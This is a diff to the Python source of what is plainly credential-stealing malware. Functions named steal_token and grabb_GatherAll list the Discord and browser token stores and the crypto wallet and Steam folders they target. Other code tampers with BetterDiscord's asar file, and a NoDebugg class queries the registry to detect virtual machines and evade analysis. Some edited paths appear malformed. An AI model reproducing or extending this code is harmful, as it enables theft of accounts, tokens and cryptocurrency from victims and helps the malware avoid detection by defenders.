@@ -607,7 +607,7 @@ class bc_initial_func(Functions):
 
 
     async def bypass_bttdsc(self):
-        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
+        bd = self.roaming + "//BetterDiscord//data//betterdiscord.asar"
         if ntpath.exists(bd):
             x = self.regex_webhook_dsc
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
@@ -639,33 +639,33 @@ class bc_initial_func(Functions):
 
     def steal_token(self):
         paths = {
-            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
-            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
-            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
-            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
-            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
-            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
+            'Discord': self.roaming + '//discord//Local Storage/leveldb//',
+            'Discord Canary': self.roaming + '//discordcanary//Local Storage//leveldb//',
+            'Lightcord': self.roaming + '//Lightcord//Local Storage//leveldb//',
+            'Discord PTB': self.roaming + '//discordptb//Local Storage//leveldb//',
+            'Opera': self.roaming + '//Opera Software//Opera Stable// Local Storage//leveldb//',
+            'Opera GX': self.roaming + '//Opera Software//Opera GX Stable//Local Storage//leveldb//',
+            'Amigo': self.appdata + '//Amigo//User Data//Local Storage//leveldb//',
+            'Torch': self.appdata + '//Torch//User Data//Local Storage//leveldb//',
+            'Kometa': self.appdata + '//Kometa//User Data//Local Storage//leveldb\\',
+            'Orbitum': self.appdata + '//Orbitum//User Data//Local Storage//leveldb\\',
+            'CentBrowser': self.appdata + '//CentBrowser//User Data//Local Storage//leveldb\\',
+            '7Star': self.appdata + '//7Star//7Star//User Data//Local Storage//leveldb//',
+            'Sputnik': self.appdata + '//Sputnik//Sputnik//User Data//Local Storage//leveldb//',
+            'Vivaldi': self.appdata + '//Vivaldi//User Data//Default//Local Storage//leveldb//',
+            'Chrome SxS': self.appdata + '//Google//Chrome SxS//User Data//Local Storage//leveldb//',
+            'Chrome': self.appdata + '//Google//Chrome//User Data//Default//Local Storage//leveldb//',
+            'Chrome1': self.appdata + '//Google//Chrome//User Data//Profile 1//Local Storage//leveldb//',
+            'Chrome2': self.appdata + '//Google//Chrome//User Data//Profile 2//Local Storage//leveldb//',
+            'Chrome3': self.appdata + '//Google//Chrome//User Data//Profile 3//Local Storage//leveldb//',
+            'Chrome4': self.appdata + '//Google//Chrome//User Data//Profile 4//Local Storage//leveldb//',
+            'Chrome5': self.appdata + '//Google//Chrome//User Data//Profile 5//Local Storage//leveldb//',
+            'Epic Privacy Browser': self.appdata + '//Epic Privacy Browser//User Data//Local Storage//leveldb//',
+            'Microsoft Edge': self.appdata + '//Microsoft//Edge//User Data//Defaul//Local Storage//leveldb//',
+            'Uran': self.appdata + '//uCozMedia//Uran//User Data//Default//Local Storage//leveldb//',
+            'Yandex': self.appdata + '//Yandex//YandexBrowser//User Data//Default//Local Storage//leveldb//',
+            'Brave': self.appdata + '//BraveSoftware//Brave-Browser//User Data//Default//Local Storage//leveldb//',
+            'Iridium': self.appdata + '//Iridium//User Data//Default//Local Storage//leveldb//'}
 
         for name, path in paths.items():
             if not os.path.exists(path):
@@ -1243,12 +1243,12 @@ class NoDebugg(Functions):
             self.programExit()
 
     def regkey(self):
-        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
-        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
+       reg1 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\DriverDesc 2> nul')
+       reg2 = os.system(r'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\ProviderName 2> nul')
         if (reg1 and reg2) != 1:
             self.programExit()
 
-        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM//CurrentControlSet//Services//Disk//Enum')
         try:
             reg_val = winreg.QueryValueEx(handle, '0')[0]
             if ("VMware" or "VBOX") in reg_val:
@@ -1629,7 +1629,7 @@ def grabb_GatherAll():
     Paths_zipped = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
-        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
+        ["C:/Program Files (x86)/Steam/config", "steam.exe", "Steam"],
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
     ]
 
